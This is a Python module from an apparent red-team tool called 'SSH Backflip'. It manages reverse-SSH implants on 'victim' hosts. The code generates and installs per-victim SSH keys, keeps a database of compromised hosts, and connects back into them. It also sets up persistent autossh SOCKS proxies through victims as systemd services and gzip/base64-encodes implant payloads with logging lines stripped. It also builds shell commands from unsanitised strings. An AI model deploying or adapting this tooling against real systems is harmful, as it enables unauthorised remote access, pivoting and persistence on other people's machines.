#!/usr/bin/env python3
# Copyright (c) 2025, Oracle and/or its affiliates.

import hashlib
import random
import os
import socket
import sys
import base64
import gzip
import re
import io
import ipaddress
import importlib
from pathlib import Path
from . import settings


def getfilehash(filename):
    sha256_hash = hashlib.sha256()
    with open(filename,"rb") as f:
    # Read and update hash string value in blocks of 4K
        while chunk := f.read(8192):
            sha256_hash.update(chunk)
        return sha256_hash
    return None

def getfilehash_md5(filename):
    md5_hash = hashlib.md5()
    with open(filename, "rb") as f:
    # Read and update hash string value in blocks of 4K
        while chunk := f.read(8192):
            md5_hash.update(chunk)
        return md5_hash
    return None



def getrandomwords(howmany:int):
    cleanwords = []
    with open("/usr/share/dict/words","r") as wordlist:
        dirtywords = random.sample(wordlist.read().splitlines(), howmany)
        for word in dirtywords:
            cleanwords.append(word.replace("'", "").lower())
    return cleanwords

def getfile(path):
    with open(path, "r") as f:
        return f.read()
    return None

def getfilehash(filename):
    sha256_hash = hashlib.sha256()
    with open(filename,"rb") as f:
    # Read and update hash string value in blocks of 4K
        while chunk := f.read(8192):
            sha256_hash.update(chunk)
        return sha256_hash
    return None

def nocomments(stuff):
    nc = re.sub('#[^!].*$', '', stuff, 0, re.M)
    o = ""
    for l in nc.splitlines(True):
        if l.strip():
            if "log" in l:
                continue
            o += l
    return o

def templify(template, replacements):
    out = template
    for k, v in replacements.items():
        out = out.replace(k, v)
    return out

def gzbase(stuff):
    out = io.BytesIO()  # Replace with BytesIO for binary data
    with gzip.GzipFile(fileobj=out, mode="wb") as f:
        f.write(nocomments(stuff).encode())
    return base64.b64encode(out.getvalue()).decode('utf-8')



class Server:
    def __init__(self, serverName, serverPort):
        self.name = serverName
        self.port = serverPort
        self.ip = None
        self.fqdn = None
        self.user = settings.BACKFLIP_USER
        self.hostKey = None
        self.hostKeyPath = f"{settings.KEYS_DIR}/serverpub.pub"
        try:
            self.ip = ipaddress.ip_address(serverName)
        except ValueError:
            self.fqdn = serverName
        except:
            print(f"Couldn't parse {self.name}. Make sure you provide a valid IP or FQDN for the server")

        # We'll want to know our server's hostkey so we can add it to the victim's known_hosts file and stuff, this will overwrite the serverpub file every time. Done this way to allow overriding the backflipServer name.
        os.system(f"echo \"{self.name} $(ssh-keyscan -p {self.port} -t ed25519 localhost 2>/dev/null | cut -d ' ' -f2-)\">{self.hostKeyPath}")
        self.hostKey = getfile(self.hostKeyPath).strip()

    def __str__(self) -> str:
        return f'Server("name:{self.name}", "ip:{self.ip}", "fqdn:{self.fqdn}", "port:{self.port}", "hostKey:{self.hostKey}"'



class Victim:
    def __init__(self, backflipServer, victimHostname, victimUsername=None, victimPort=None):
        self.username = victimUsername
        self.hostname = victimHostname
        self.port = victimPort
        self.privKeyPath = None
        self.privKey = None
        self.pubKeyPath = None
        self.pubKey = None
        self.backflipServer = backflipServer
        if self.port is None:
            self.port = get_available_port()
        if self.username is None:
            self.username = f"{getrandomwords(1)[0]}_victim"
            print(f"""\n[!!!] You didn't provide the victim username. Their username is necessary for connecting into the victim host.\n\tThe first time the backflip implant runs it will do a faceplant, aka leak the victim username through a connection attempt to the backflip server. \n\t Look for the victim username in the backflip server ssh logs like this:\n\t\t'sudo journalctl -u ssh-backflips -S 2024-10-12 | grep "user {self.username.split("_")[0]}"'\n\tThen update the backflips database with that username.\n""")
        self.keygen()
        self.commit()

    def __str__(self) -> str:
        return f'Victim("username:{self.username}", "hostname:{self.hostname}", "victimPort:{self.port}")'

    def keygen(self):
        keyPath = f"{settings.KEYS_DIR}/{self.username}-{self.hostname}-{self.backflipServer.name}"
        if not Path(keyPath).exists():
            print ("[*] generating new set of rsa keys")
            os.system(f"ssh-keygen -t rsa -b 2048 -C '' -q -f '{keyPath}' -N ''")
            print ("[*] adding key to authorized_keys on our backflips server")
            os.system(f"echo '' >> {settings.BACKFLIPS_BASE_DIR}/authorized_keys")
            os.system(f"cat '{keyPath}.pub' >> {settings.BACKFLIPS_BASE_DIR}/authorized_keys")

        self.pubKeyPath = f"{keyPath}.pub"
        self.pubKey = getfile(self.pubKeyPath)
        self.privKeyPath = keyPath
        self.privKey = getfile(self.privKeyPath)

    def commit(self):
        if not self.privKeyPath:
            print("This victim doesn't have keys yet. You must run victim.keygen() first.")
            quit()
        if not exists_backflip(self.hostname):
            if not exists_port(self.port):
                with open(settings.BACKFLIPS_DB, "a") as settings.backflips_db:
                    instance = f"""## SSH Backflip instance: Target Hostname: {self.hostname} - Backflip Port: {self.port}
Host {self.hostname}
    User {self.username}
    Hostname 127.0.0.1
    Port {self.port}
    IdentityFile {self.privKeyPath}
## End SSH Backflip instance {self.hostname}
\n"""
                    settings.backflips_db.write(instance)
            else:
                print(f"Port '{self.port}' is already allocated, select a different one.")
                quit()
        else:
            print(f"A backflip instance named '{self.hostname}' already exists, select a different name.")
            quit()


def exists_backflip(backflipInstanceName):
    with open(settings.BACKFLIPS_DB, "r") as backflip_db:
        db = backflip_db.read()
        if backflipInstanceName in db:
            return True
        else:
            return False


def exists_port(victimPort):
    with open(settings.BACKFLIPS_DB, "r") as backflip_db:
        db = backflip_db.read()
        if str(victimPort) in db:
            return True
        else:
            return False


def list_backflips(args):
    print(f"\nListing SSH Backflip instances from database {settings.BACKFLIPS_DB}:\n")
    with open(settings.BACKFLIPS_DB, "r") as backflip_db:
        for (n, line) in enumerate(backflip_db):
            if "## SSH Backflip instance: Target Hostname:" in line:
                print(line)


def locate_backflip(backflipInstanceName):
    start = find_in_file(f"## SSH Backflip instance: Target Hostname: {backflipInstanceName}", settings.BACKFLIPS_DB)
    end = find_in_file(f"## End SSH Backflip instance {backflipInstanceName}", settings.BACKFLIPS_DB)
    with open(settings.BACKFLIPS_DB, "r") as backflip_db:
        content = backflip_db.readlines()
        backflipInstance = content[start:end]
    return start, end, backflipInstance


def find_in_file(token, file):
    with open(file, "r") as f:
        for (n, line) in enumerate(f):
            if token in line:
                return n
    return -1


def delete_backflip(args):
    backflipInstanceName = args.targetHost
    if not exists_backflip(backflipInstanceName):
        print(f"Couldn't find a backflip instance with the name {backflipInstanceName} in the database. Check the available instances with the 'list' command")
        sys.exit(1)

    print(f"Deleting backflip instance: {backflipInstanceName}")
    bfStart, bfEnd, bfInstance =  locate_backflip(backflipInstanceName)
    victimPort = bfInstance[4].strip().split()[1]

    # delete host from ssh_config AKA backflipsDB
    with open(settings.BACKFLIPS_DB, "r") as backflip_db:
        oldContent = backflip_db.readlines()
        newContent = oldContent[:bfStart] + oldContent[bfEnd+2:]

    with open(f"{settings.BACKFLIPS_DB}.old", "w") as f:
        f.writelines(oldContent)

    with open(settings.BACKFLIPS_DB, "w") as f:
        f.writelines(newContent)

    # delete from known_hosts
    os.system(f'ssh-keygen -f "/root/.ssh/known_hosts" -R "[127.0.0.1]:{victimPort}"')

    # ToDo: delete keys or tag them as inactive by changing the name


def get_available_port():
    print("Finding the next available port for an ssh backflip instance.")
    avail = -1
    ports = set()
    with open(settings.BACKFLIPS_DB, "r") as backflip_db:
        for (n, line) in enumerate(backflip_db):
            if "Port " in line:
                ports.add(int(line.split()[1]))
        unused = {n for n in range(4001,5000)}.difference(ports)
        avail = sorted(unused)[0]
        return avail

def check_port(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex(('127.0.0.1', port))
    if result == 0:
        return True
    else:
        return False

def makeimplant(backflipServer, victim, args):
    implantMod = importlib.import_module(f"sshbackflip.{args.targetOS}")
    implantMod.makebackflip(backflipServer, victim, args)


def connect_backflip(args):
    if exists_backflip(args.targetHost):
        print(f"Connecting to SSH Backflip target: {args.targetHost}")
        os.system(f"ssh -F {settings.BACKFLIPS_DB} {args.targetHost}")
    else:
        print(f"Couldn't find a backflip instance with host name {args.targetHost} in the database {settings.BACKFLIPS_DB}")


def socks_on(backflipInstanceName):
    print(f"Enabling SOCKS proxy for {backflipInstanceName}")
    if not exists_backflip(backflipInstanceName):
        print(f"Couldn't find a backflip instance with host name {backflipInstanceName} in the database {settings.BACKFLIPS_DB}")
        sys.exit(1)

    print(f"Starting SOCKS proxy for SSH Backflip target: {backflipInstanceName}")

    # read in backflip instance information: port and key
    bfStart, bfEnd, bfInstance =  locate_backflip(backflipInstanceName)
    victimPort = int(bfInstance[4].strip().split()[1])
    socksPort = victimPort - 1000
    systemdUnitPath = Path(f"/etc/systemd/system/backflip-socks-{backflipInstanceName}-{victimPort}.service")

    # check backflip port for this instance is listening, aka, the victim is connected
    if not check_port(victimPort):
        print(f"Victim does not appear to be connected. Local TCP port {victimPort} is not listening. The victim must be connected to enable the SOCKS proxy.")
        sys.exit(1)

    # check socksport is available to assign
    if check_port(socksPort):
        print(f"Local port {socksPort} is in use, can't start the SOCKS proxy. Please release the port so backflips can use it")
        sys.exit(1)

    # render autossh service unit from template and write it in the systemd directory where service unit files go
    template_unit_socks = f"""[Unit]
Description=SSH backflip SOCKS proxy to {backflipInstanceName}
After=network.target auditd.service

[Service]
ExecStart=/usr/bin/autossh -M0 -F {settings.BACKFLIPS_DB} -oServerAliveInterval=30 -oServerAliveCountMax=5 -oUserKnownHostsFile=/dev/null -oStrictHostKeyChecking=no -oBatchMode=yes -n -N -D :{socksPort} {backflipInstanceName}
Restart=on-failure
RestartSec=30s

[Install]
WantedBy=multi-user.target
"""

    print(f"Writing systemd service unit file {systemdUnitPath}\n")
    print(f"{template_unit_socks}\n")
    with open(systemdUnitPath, "w") as f:
        f.write(template_unit_socks)

    # Attempt to start and enable the service
    os.system("systemctl daemon-reload")
    socksServiceName = os.path.basename(systemdUnitPath)
    if not os.system(f"systemctl start {socksServiceName}"):
        print(f"Failed to start the autossh SOCKS service. You may need to manualy troubleshoot the service unit.")
        sys.exit(1)
    os.system(f"systemctl enable {socksServiceName}")

    print(f"SOCKS proxy has been enabled for {backflipInstanceName} on port {socksPort}.\n Have a nice day!")


def socks_off(backflipInstanceName):
    print(f"Disabling SOCKS proxy for {backflipInstanceName}")
    if not exists_backflip(backflipInstanceName):
        print(f"Couldn't find a backflip instance with host name {backflipInstanceName} in the database {settings.BACKFLIPS_DB}")
        sys.exit(1)

    print(f"Stopping SOCKS proxy for SSH Backflip target: {backflipInstanceName}")

    # read in backflip instance information: port and key
    bfStart, bfEnd, bfInstance =  locate_backflip(backflipInstanceName)
    victimPort = bfInstance[4].strip().split()[1]
    systemdUnitPath = Path(f"/etc/systemd/system/backflip-socks-{backflipInstanceName}-{victimPort}.service")
    socksServiceName = os.path.basename(systemdUnitPath)

    if not systemdUnitPath.exists():
        print(f"Couldn't find the backflip SOCKS autossh service unit file for {backflipInstanceName} at expected path: {systemdUnitPath}")
        sys.exit(1)

    # systemctl stop and disable unit
    os.system(f"systemctl stop {socksServiceName}")
    os.system(f"systemctl disable {socksServiceName}")
    # delete service unit
    systemdUnitPath.unlink()
    # systemctl daemon-reload
    os.system(f"systemctl daemon-reload")

    print(f"SOCKS proxy has been disabled for {backflipInstanceName}.\n Have a nice day!")

def manage_socks(args):
    backflipInstanceName = args.targetHost
    if args.socksToggle:
        socks_on(backflipInstanceName)
    elif args.socksToggle is False:
        socks_off(backflipInstanceName)


def setup_backflip(args):
    if args.backflipServer is None:
        bfServer = settings.BACKFLIP_SERVER
    else:
        bfServer = args.backflipServer

    servidor = Server(bfServer, settings.BACKFLIP_PORT)
    victima= Victim(servidor, args.targetHost, args.targetUser, args.localPort)
    makeimplant(servidor, victima, args)
